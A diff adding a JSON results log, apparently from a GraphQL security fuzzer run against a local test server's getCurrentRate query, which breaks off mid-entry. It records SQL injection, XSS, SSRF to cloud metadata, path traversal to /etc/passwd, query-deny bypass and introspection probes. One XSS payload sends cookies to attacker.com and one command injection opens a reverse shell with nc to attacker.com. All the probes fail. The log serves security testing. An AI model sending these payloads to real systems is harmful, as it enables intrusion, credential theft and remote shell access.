@@ -1,0 +1,4001 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:22:03.573236Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:22:05.644564Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<script>alert(document.domain)</script>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:22:08.479854Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"http://169.254.169.254/latest/meta-data\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:22:10.078407Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD; nc 127.0.0.1 4444\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:22:12.856600Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../../../etc/passwd\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.013,
+    "timestamp": "2025-10-07T02:22:14.791221Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<img src=x onerror=alert('hacked')>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-07T02:22:16.615754Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-07T02:23:59.469235Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.003,
+        "timestamp": "2025-10-07T02:23:59.472759Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-07T02:23:59.472783Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.005,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.013,
+    "timestamp": "2025-10-07T02:22:19.348816Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(name: \"Query\") {\n    fields {\n      name\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:22:21.733279Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 33
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Unknown argument \"name\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"name\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.003,
+    "timestamp": "2025-10-07T02:24:01.455315Z",
+    "count": 11,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM rates--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:24:03.735528Z",
+    "count": 12,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<script>document.location='https://attacker.com?'+document.cookie</script>\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-07T02:24:06.725201Z",
+    "count": 13,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"http://169.254.169.254/latest/meta-data/\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-07T02:24:09.170485Z",
+    "count": 14,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"$(nc -e /bin/sh attacker.com 4444)\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:24:11.760966Z",
+    "count": 15,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../../../var/lib/postgresql/data/postgresql.conf\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:24:14.451360Z",
+    "count": 16,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"<iframe src='javascript:alert(document.domain)'>\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:24:16.409310Z",
+    "count": 17,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.01,
+        "timestamp": "2025-10-07T02:24:18.866928Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:24:18.872032Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 18,
+    "timestamp": "2025-10-07T02:24:18.872066Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.019,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  s: getCurrentRate(mainCurrencySymbol: \"USD\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.02,
+        "timestamp": "2025-10-07T02:24:20.680963Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-07T02:24:20.684713Z",
+        "response_body": {
+          "data": {
+            "s": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-07T02:24:20.684723Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    types {\n      name\n      fields {\n        name\n        type {\n          name\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:24:23.358082Z",
+    "count": 20,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", invalidArg: \"exploit\")\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:24:26.355974Z",
+    "count": 21,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"invalidArg\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 45
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"invalidArg\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:25:05.937016Z",
+    "count": 22,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:25:08.009860Z",
+    "count": 23,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
